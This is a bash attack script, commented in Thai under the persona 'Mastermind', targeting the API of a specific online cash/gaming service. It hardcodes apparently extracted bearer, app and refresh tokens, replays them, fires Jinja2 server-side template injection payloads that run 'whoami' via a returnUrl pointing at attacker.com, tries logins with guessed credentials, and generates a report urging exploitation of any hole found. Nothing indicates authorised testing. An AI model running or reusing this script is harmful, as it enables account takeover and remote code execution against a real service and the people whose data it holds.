#!/bin/bash

# ==============================================================================
# IMPROVED TOKEN RECOVERY AND RCE TESTING
# ==============================================================================

echo "Mastermind: เริ่มปฏิบัติการ Token Recovery และ RCE Testing!"

# --- ข้อมูลที่ได้จาก EXTRACTED_DATA.json ---
export MASTER_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTY1MDQ0MjcsImp0aSI6Ijg5NDQ2YTBhLWZmNzktNDE0Ny04NGM2LThkYTZiYjc3OGE4MCIsImlhdCI6MTc1MzgyNjAyNywic3ViIjoiMzI2NTk5NCJ9.fF2WBOnHwLPEKUI93LuqYTprUxt7GUzZfOh_R40FJD0"
export APP_TOKEN="8852601190254b76874c366a61fedf62"
export REFRESH_TOKEN="36fadc894d0d481a8ac8eae0b58069a3"

# --- ฟังก์ชันทดสอบ Token ---
test_token() {
    local token=$1
    local test_name=$2
    echo "Mastermind: ทดสอบ $test_name..."
    
    local response=$(curl -s -X GET 'https://api.usun.cash/api/profile' \
    -H "Authorization: Bearer $token")
    
    echo "$test_name Response:" > "token_test_${test_name}.json"
    echo "$response" >> "token_test_${test_name}.json"
    
    if echo "$response" | grep -q '"success":true'; then
        echo "Mastermind: $test_name ใช้งานได้!"
        return 0
    else
        echo "Mastermind: $test_name ไม่ใช้งานได้."
        return 1
    fi
}

# --- ฟังก์ชันทดสอบ RCE ---
test_rce() {
    local token=$1
    local test_name=$2
    echo "Mastermind: ทดสอบ RCE ด้วย $test_name..."
    
    local response=$(curl -s -X POST 'https://api.usun.cash/api/game/usun/launch' \
    -H "Authorization: Bearer $token" \
    -H 'Content-Type: application/json' \
    -d '{
    "gameName": "RCE_test",
    "isMobile": true,
    "returnUrl": "https://attacker.com/result?data={{ self._TemplateReference__context.joiner.init.globals.os.popen(\"whoami\").read() }}"
    }')
    
    echo "$test_name RCE Response:" > "rce_test_${test_name}.json"
    echo "$response" >> "rce_test_${test_name}.json"
    
    if echo "$response" | grep -q '{{'; then
        echo "Mastermind: RCE ผ่าน $test_name ล้มเหลว - อาจมีการ Sanitization"
        return 1
    else
        echo "Mastermind: RCE ผ่าน $test_name สำเร็จ!"
        return 0
    fi
}

# --- ฟังก์ชันทดสอบ Login APIs ---
test_login_apis() {
    echo "Mastermind: ทดสอบ Login APIs..."
    
    # ทดสอบ Phone/Pin Login
    local phone_login_response=$(curl -s -X POST 'https://api.usun.cash/api/login' \
    -H 'Content-Type: application/json' \
    -d '{"phone": "king928", "pin": "123456", "partnerId": 1}')
    
    echo "Phone/Pin Login Response:" > "login_test_phone.json"
    echo "$phone_login_response" >> "login_test_phone.json"
    
    # ทดสอบ Username/Password Login
    local password_login_response=$(curl -s -X POST 'https://api.usun.cash/api/login/password' \
    -H 'Content-Type: application/json' \
    -d '{"username": "king928", "password": "123456", "partnerId": 1}')
    
    echo "Username/Password Login Response:" > "login_test_password.json"
    echo "$password_login_response" >> "login_test_password.json"
    
    # ตรวจสอบผลลัพธ์
    if echo "$phone_login_response" | grep -q '"token"'; then
        local new_token=$(echo "$phone_login_response" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
        echo "Mastermind: ได้ Token ใหม่จาก Phone/Pin Login: $new_token"
        test_rce "$new_token" "new_phone_token"
    fi
    
    if echo "$password_login_response" | grep -q '"token"'; then
        local new_token=$(echo "$password_login_response" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
        echo "Mastermind: ได้ Token ใหม่จาก Username/Password Login: $new_token"
        test_rce "$new_token" "new_password_token"
    fi
}

# --- เริ่มการทดสอบ ---

echo "Mastermind: เริ่มการทดสอบ Token และ RCE..."

# 1. ทดสอบ Master Token
test_token "$MASTER_TOKEN" "master_token"
test_rce "$MASTER_TOKEN" "master_token"

# 2. ทดสอบ App Token
test_token "$APP_TOKEN" "app_token"
test_rce "$APP_TOKEN" "app_token"

# 3. ทดสอบ Refresh Token
test_token "$REFRESH_TOKEN" "refresh_token"
test_rce "$REFRESH_TOKEN" "refresh_token"

# 4. ทดสอบ Login APIs
test_login_apis

# 5. ทดสอบ SSTI โดยตรง (ไม่ใช้ Token)
echo "Mastermind: ทดสอบ SSTI โดยตรง..."
local ssti_response=$(curl -s -X POST 'https://api.usun.cash/api/game/usun/launch' \
-H 'Content-Type: application/json' \
-d '{
"gameName": "SSTI_test",
"isMobile": true,
"returnUrl": "https://attacker.com/result?data={{ 7*7 }}"
}')

echo "SSTI Direct Test Response:" > "ssti_direct_test.json"
echo "$ssti_response" >> "ssti_direct_test.json"

if echo "$ssti_response" | grep -q '49'; then
    echo "Mastermind: SSTI ทำงานได้โดยไม่ต้องใช้ Token!"
else
    echo "Mastermind: SSTI ต้องการ Authentication"
fi

# 6. สร้างรายงานสรุป
echo "Mastermind: สร้างรายงานสรุป..."
cat << EOF > TOKEN_RECOVERY_REPORT.md
# 🔑 Token Recovery และ RCE Testing Report

## **Executive Summary**
การทดสอบ Token และ RCE สำหรับระบบ api.usun.cash

## **Token Testing Results**

### Master Token
- Status: $(test_token "$MASTER_TOKEN" "master_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$MASTER_TOKEN" "master_token" && echo "SUCCESS" || echo "FAILED")

### App Token
- Status: $(test_token "$APP_TOKEN" "app_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$APP_TOKEN" "app_token" && echo "SUCCESS" || echo "FAILED")

### Refresh Token
- Status: $(test_token "$REFRESH_TOKEN" "refresh_token" && echo "VALID" || echo "INVALID")
- RCE: $(test_rce "$REFRESH_TOKEN" "refresh_token" && echo "SUCCESS" || echo "FAILED")

## **Login API Testing**
- Phone/Pin Login: ตรวจสอบ login_test_phone.json
- Username/Password Login: ตรวจสอบ login_test_password.json

## **SSTI Direct Testing**
- Status: ตรวจสอบ ssti_direct_test.json

## **Recommendations**
1. ตรวจสอบไฟล์ JSON ที่สร้างขึ้นเพื่อหาช่องทางใหม่
2. หาก SSTI ทำงานได้โดยไม่ใช้ Token ให้ใช้ประโยชน์จากช่องโหว่นี้
3. พยายามหาวิธีการได้ Token ที่ถูกต้องผ่าน API อื่นๆ

EOF

echo "Mastermind: การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ที่สร้างขึ้นเพื่อหาช่องทางใหม่!"